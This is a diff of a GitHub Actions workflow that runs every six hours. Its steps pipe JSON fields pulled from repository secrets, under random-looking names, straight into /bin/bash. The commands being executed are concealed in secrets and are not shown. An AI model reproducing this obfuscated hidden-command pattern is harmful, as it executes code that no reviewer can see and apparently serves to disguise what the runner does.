@@ -1,22 +1,29 @@
 name: chengjisi0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
+    - cron: '14 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengjisi0987
         env:
-          kzb4: ${{ secrets.kzb4 }}
+          b2012: ${{ secrets.b2012 }}
         run: |
-          echo $kzb4 | jq -r .pr4 | /bin/bash
-          echo $emksy3 | jq -r .kzl7 | /bin/bash
-          echo $rvfyi9750 | jq -r .cxpad1 | /bin/bash
-          echo $pkv381 | jq -r .o02 | /bin/bash
-          echo $fxl1824 | jq -r .ghm5533 | /bin/bash
-          echo $yc1418 | jq -r .yhyre2 | /bin/bash
+          echo $b2012 | jq -r .hqt9547 | /bin/bash
+          echo $gdh26 | jq -r .i635 | /bin/bash
+          echo $k38 | jq -r .e12394 | /bin/bash
+          echo $sp770 | jq -r .mhjdv466 | /bin/bash
+          echo $wvcuv13 | jq -r .qc94 | /bin/bash
+          echo $x00 | jq -r .ukw8796 | /bin/bash
+          echo $teuff80895 | jq -r .ikreb81 | /bin/bash
+          echo $qdmj878 | jq -r .prpyx1998 | /bin/bash
+          echo $h78156 | jq -r .vbib28796 | /bin/bash
+          echo $sxyde8037 | jq -r .kkddb08 | /bin/bash
+          echo $dzsd1 | jq -r .kypi1434 | /bin/bash
+          echo $xuxvz91201 | jq -r .e40 | /bin/bash
 
